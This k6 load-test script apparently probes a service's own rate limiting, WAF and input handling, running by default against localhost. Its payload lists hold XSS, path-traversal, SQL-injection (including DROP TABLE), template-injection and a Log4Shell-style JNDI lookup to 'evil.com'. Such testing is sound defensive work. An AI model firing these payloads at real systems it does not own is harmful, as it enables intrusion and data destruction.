import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';

// Custom metrics
const badActorErrorRate = new Rate('bad_actor_error_rate');
const badActorLatency = new Trend('bad_actor_latency');
const rateLimitHits = new Rate('rate_limit_hits');
const wafBlocks = new Rate('waf_blocks');

// Configuration from environment
const BASE_URL = __ENV.BASE_URL || 'http://127.0.0.1:8080';
const DURATION = __ENV.DURATION || '30s';
const VUS = __ENV.VUS || '5';

export let options = {
  stages: [
    { duration: '5s', target: Math.floor(parseInt(VUS) * 0.5) },  // Ramp up
    { duration: DURATION, target: parseInt(VUS) },    // Steady state
    { duration: '5s', target: parseInt(VUS) * 3 },  // Aggressive spike
    { duration: '5s', target: parseInt(VUS) },       // Back to steady
    { duration: '5s', target: 0 },                   // Ramp down
  ],
  thresholds: {
    bad_actor_error_rate: ['rate>0.1'],              // Expect high error rate
    rate_limit_hits: ['rate>0.05'],                  // Should hit rate limits
    waf_blocks: ['rate>0.01'],                      // Should trigger WAF
  },
};

export default function () {
  // Test 1: Rapid fire requests to trigger rate limiting
  for (let i = 0; i < 10; i++) {
    let response = http.get(`${BASE_URL}/healthz`);
    let checkResult = check(response, {
      'rapid fire status': (r) => r.status === 200 || r.status === 429,
    });
    
    if (response.status === 429) {
      rateLimitHits.add(1);
    }
    
    badActorErrorRate.add(!checkResult);
    badActorLatency.add(response.timings.duration);
  }

  // Test 2: Malicious payloads to trigger WAF
  const maliciousPayloads = [
    '<script>alert("xss")</script>',
    '../../../etc/passwd',
    'SELECT * FROM users; DROP TABLE users;',
    '${jndi:ldap://evil.com/a}',
    'eval(process.exit(1))',
    '{{7*7}}',
    '${7*7}',
  ];

  for (const payload of maliciousPayloads) {
    let response = http.get(`${BASE_URL}/api/transactions?search=${encodeURIComponent(payload)}`);
    let checkResult = check(response, {
      'malicious payload handled': (r) => r.status === 200 || r.status === 400 || r.status === 403,
    });
    
    if (response.status === 403) {
      wafBlocks.add(1);
    }
    
    badActorErrorRate.add(!checkResult);
    badActorLatency.add(response.timings.duration);
  }

  // Test 3: Large payloads to test body size limits
  const largePayload = 'x'.repeat(10000); // 10KB payload
  let largeResponse = http.post(`${BASE_URL}/api/transactions`, JSON.stringify({
    data: largePayload,
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  let largeCheck = check(largeResponse, {
    'large payload handled': (r) => r.status === 200 || r.status === 413 || r.status === 400,
  });
  
  badActorErrorRate.add(!largeCheck);
  badActorLatency.add(largeResponse.timings.duration);

  // Test 4: Invalid JSON to test parsing errors
  let invalidJsonResponse = http.post(`${BASE_URL}/api/transactions`, '{"invalid": json}', {
    headers: { 'Content-Type': 'application/json' },
  });
  
  let invalidJsonCheck = check(invalidJsonResponse, {
    'invalid JSON handled': (r) => r.status === 200 || r.status === 400,
  });
  
  badActorErrorRate.add(!invalidJsonCheck);
  badActorLatency.add(invalidJsonResponse.timings.duration);

  // Test 5: SQL injection attempts
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE transactions; --",
    "1' UNION SELECT * FROM users --",
    "admin'--",
    "1' OR 1=1 --",
  ];

  for (const sqlPayload of sqlPayloads) {
    let response = http.get(`${BASE_URL}/api/transactions?signature=${encodeURIComponent(sqlPayload)}`);
    let checkResult = check(response, {
      'SQL injection handled': (r) => r.status === 200 || r.status === 400 || r.status === 403,
    });
    
    if (response.status === 403) {
      wafBlocks.add(1);
    }
    
    badActorErrorRate.add(!checkResult);
    badActorLatency.add(response.timings.duration);
  }

  sleep(0.5); // 500ms between attack patterns
}

export function handleSummary(data) {
  const duration = data.metrics.iteration_duration && data.metrics.iteration_duration.values ? data.metrics.iteration_duration.values.avg : 0;
  const rps = data.metrics.http_reqs && data.metrics.http_reqs.values ? data.metrics.http_reqs.values.rate : 0;
  const p95 = data.metrics.http_req_duration && data.metrics.http_req_duration.values ? data.metrics.http_req_duration.values['p(95)'] : 0;
  const p99 = data.metrics.http_req_duration && data.metrics.http_req_duration.values ? data.metrics.http_req_duration.values['p(99)'] : 0;
  const errorRate = data.metrics.bad_actor_error_rate && data.metrics.bad_actor_error_rate.values ? data.metrics.bad_actor_error_rate.values.rate * 100 : 0;
  const rateLimitHits = data.metrics.rate_limit_hits && data.metrics.rate_limit_hits.values ? data.metrics.rate_limit_hits.values.rate * 100 : 0;
  const wafBlocks = data.metrics.waf_blocks && data.metrics.waf_blocks.values ? data.metrics.waf_blocks.values.rate * 100 : 0;
  
  return {
    'bad_actor_summary.json': JSON.stringify(data, null, 2),
    stdout: `
=== Bad Actor Load Test Summary ===
Duration: ${duration.toFixed(2)}ms avg
RPS: ${rps.toFixed(2)} req/s
P95: ${p95.toFixed(2)}ms
P99: ${p99.toFixed(2)}ms
Error Rate: ${errorRate.toFixed(2)}%
Rate Limit Hits: ${rateLimitHits.toFixed(2)}%
WAF Blocks: ${wafBlocks.toFixed(2)}%
`,
  };
}
